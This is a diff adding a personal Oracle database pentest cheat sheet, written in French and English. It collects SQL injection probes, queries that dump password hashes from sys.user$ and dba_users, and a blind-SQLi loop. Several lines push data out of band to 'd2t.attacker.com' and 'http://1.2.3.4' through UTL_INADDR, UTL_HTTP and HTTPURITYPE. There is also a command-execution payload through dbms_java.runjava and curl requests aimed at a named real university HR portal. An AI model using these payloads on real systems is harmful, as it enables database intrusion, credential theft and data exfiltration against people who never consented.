@@ -1,0 +1,132 @@
+# oracle
+
+# cve-2012-3137 offline passsord cracking
+http://www.teamshatter.com/topics/general/team-shatter-exclusive/oracle-database-11g-stealth-password-cracking-vulnerability-in-logon-protocol-cve-2012-3137/
+http://www.cernatis.com/index.php/blog/all-postings/item/5-oracle-database-authentication-protocol-security-bypass-vulnerability
+http://github.com/r1-/cve-2012-3137
+https://github.com/hantwister/o5logon-fetch
+
+# batched statements
+dbms_xmlgen.newcontext()
+
+# Oracle Report (/reports/rwservlet)
+http://netinfiltration.com/
+https://github.com/Mekanismen/pwnacle-fusion
+
+# le blog d'un pentester expert en intrusion d'oracle
+www.notsosecure.com
+
+# RedoWalker dumps Oracle redo logs to an XML format; it specifically dumps redo entries fro DDL, INSERTs, UPDATEs, DELETEs and associated UNDO records.
+http://www.davidlitchfield.com/redowalker.htm
+
+# tester si listener protégé depuis l'extérieur (recup version et SID)
+metasploit: scanner/oracle/tnslsnr_version et scanner/oracle/sid_enum
+tnscmd.pl ou tnscmd10g.pl
+
+# tester localement
+lsnrctl (dans $ORACLE_HOME/bin un truc comme ça)
+
+## audit
+set heading off
+spool c:\temp\spool.log
+
+select user from dual;
+select * from v$version;
+select * from dba_registry  -- installed database components
+select * from dba_registry_history -- get patch level
+... oracle.pdf
+Autres types de privileges, verifier que les comptes de production sont restreints
+Auditing: parametres de configuration, en rapport avec la securité, politique de mot de passe
+
+## pentest
+# confirming Oracle
+id=1 AND ROWNUM=ROWNUM
+id=1 AND LENGTH(SYSDATE)=LENGTH(SYSDATE)
+
+# arbitrary value to test injection
+select 1 from dual
+select 'foo' from dual
+
+# current user
+select user from dual
+select sys.login_user from dual
+
+# version
+select banner from v$version where rownum=1 # blind => pas plus d'1 seule ligne
+select version from v$instance # version en plus court
+
+# sid, service_name, ...
+select global_name from global_name
+select sys.database_name from dual
+select name from v$database
+select instance_name from v$instance
+show parameter instance_name
+show parameter service_names
+
+# system information
+SELECT dbms_utility.port_string FROM dual
+select UTL_INADDR.get_host_address from dual
+select UTL_INADDR.get_host_name from dual
+
+# tables
+select table_name from user_tables # tables you own
+select table_name from all_tables  # tables you can access
+select distinct table_name from user_tab_privs
+select object_name from user_objects where object_type = 'TABLE';
+select table_name from all_tables where table_name not like '%$%' and owner NOT IN ('SYS', 'SYSTEM', 'OUTLN', 'TSMSYS', 'DBSNMP', 'WMSYS', 'SYSMAN', 'MDSYS')
+
+# colonnes
+select column_name from user_tab_columns where table_name='UNE_TABLE'
+select column_name from all_tab_columns where table_name='UNE_TABLE'
+
+# owners - proprietaires de schemas
+select distinct owner from all_tables
+select distinct owner from all_tables where table_name not like '%$%' and owner NOT IN ('SYS', 'SYSTEM', 'OUTLN', 'TSMSYS', 'DBSNMP', 'WMSYS', 'SYSMAN', 'MDSYS')
+select owner from (select ROWNUM R, owner from (select distinct(owner) from all_tables)) where r=$i # blind sqli
+
+# users
+select username from all_users # ou sys.all_users
+select name, password from sys.user$
+select username,password,account_status from dba_users;
+
+# sortir
+select UTL_INADDR.get_host_address('d2t.attacker.com') from dual
+select UTL_HTTP.REQUEST('http://1.2.3.4:53/?q='||(select 123 from dual)) from dual
+SELECT HTTPURITYPE('http://1.2.3.4/?q='||(select 123 from dual)).getXML() FROM DUAL; # pas possible de specifier un port different
+select UTL_FILE. FIXME
+
+#fichier
+select value from v$parameter where name = 'utl_file_dir';
+select * from all_directories where rownum=1; # DIRECTORY_NAME, DIRECTORY_PATH
+select * from dba_directories where rownum=1; # DIRECTORY_NAME, DIRECTORY_PATH
+
+#liste des privileges
+select * from session_privs
+select * from user_sys_privs
+select * from user_role_privs
+select * from user_tab_privs
+select * from dba_sys_privs
+select * from dba_role_privs
+select * from dba_tab_privs
+
+select * from dba_sys_privs where grantee = 'DBSNMP'
+select * from dba_role_privs where grantee = sys.login_user
+
+select grantee from dba_sys_privs where privilege = 'SELECT ANY DICTIONARY'
+select grantee from dba_role_privs where granted_role='DBA' # liste des DBAs
+
+# blind sqli
+select count(*) from UNE_TABLE
+select count(*) from all_tab_columns where table_name = 'UNE_TABLE'
+for i in {1..49}; do ./a.py "select column_name from (select ROWNUM R,column_name from all_tab_columns where table_name = 'UNE_TABLE') where R=$i"; done
+
+# time-based blind sqli
+# use heavy queries
+select 1 from dual where (select count(*) from user_objects,user_objects, user_objects)=0;
+
+##
+curl -v 'https://myhr.sydney.edu.au/pls/portal/%0A' -> <set-cookie>
+curl -H 'Cookie: <set-cookie>' https://myhr.sydney.edu.au/dav_portal/portal/
+
+# rce through dbms_java.runjava
+select dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"') from dual
